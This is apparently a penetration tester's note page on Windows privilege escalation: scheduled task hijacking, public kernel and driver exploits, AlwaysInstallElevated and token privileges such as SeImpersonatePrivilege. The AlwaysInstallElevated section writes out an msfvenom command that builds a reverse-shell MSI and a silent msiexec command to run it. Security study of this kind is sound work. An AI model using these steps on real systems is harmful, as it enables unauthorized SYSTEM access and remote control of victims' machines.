---
tags:
  - "#type/tech-specific"
  - "#attack/privilege-escalation"
---
# Fundamentals

See:

- [[2 Tech-Specifics/OS/Windows/Privilege Escalation Windows/Overview - Privilege Escalation Windows|Overview - Privilege Escalation Windows]]
- [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows|Fundamentals - Windows]]

# Pentesting

## Scheduled Tasks Executable Hijacking

Modify the executable that is used by a scheduled task

1. enumerate scheduled tasks: `schtasks /query /fo LIST /v`
	- **Note:** the command output is very long
	- check:
		- user executing the task: `Run As User`
		- triggers set for task execution: `Last Run Time`, `Next Run Time`, `Schedule Type`
		- actions / executables: `Task To Run`
2. check privileges on the executable run by the task

## Public Exploits

Use public exploits for privilege escalation.

Enumerate using [[2 Tech-Specifics/OS/Windows/Privilege Escalation Windows/Manual Enumeration - Windows|Manual Enumeration - Windows]]:

- Installed applications
- OS version: **Kernel exploits might make the system unusable** --> test them beforehand
- Drivers: are not updated very often, exploits may be available online
	`driverquery`: list installed drivers

See [[1 Methods/Security-Testing/4 Execution/Using Public Exploits|Using Public Exploits]]

## AlwaysInstallElevated

If windows installer files (.msi) always run with elevated privileges, we can create a malicious .msi file and run it on the target system

prerequisites: the following registry options have to be set:

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

1. generate payload, eg using [[3 Tools/exploitation frameworks/Metasploit/msfvenom]]: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi`
2. transfer payload to target
3. start installer: `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

## Privileges

### SeImpersonatePrivilege

This is usually not granted to normal users, but to many service users such as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity.

Often possible when escalating privileges from an [[2 Tech-Specifics/Web/Web basics|IIS Web Server]]

If a user has the `SeImpersonatePrivilege` privilege set, [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Named Pipes|Named Pipes]] can be used to impersonate another user. Open a named pipe and coerce a user to connect to it --> then it can be impersonated.

**Tools:**

- [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

### SeBatchLogonRight

if user has the [Log on as a batch job](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/log-on-as-a-batch-job) permission set: schedule a task that is executed as the user

### Further Privileges:

These privileges can lead to privilege escalation:

- SeBackupPrivilege: see [Github](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
- SeAssignPrimaryToken
- SeLoadDriver
- SeDebug
